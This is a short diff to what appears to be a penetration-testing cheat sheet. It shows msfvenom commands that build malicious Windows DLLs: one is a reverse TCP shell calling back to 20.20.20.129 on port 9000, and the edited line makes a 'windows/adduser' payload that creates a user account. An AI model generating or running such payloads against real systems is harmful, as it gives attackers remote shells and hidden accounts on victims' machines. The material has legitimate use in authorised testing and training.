@@ -56,7 +56,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f dll > rev
 ```
 ### Adduser Payload
 ```
-msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD_MATCHING_COPLEXITY>
+msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD_MATCHING_COPLEXITY> -f dll > adduser.dll
 ```
 
 ---
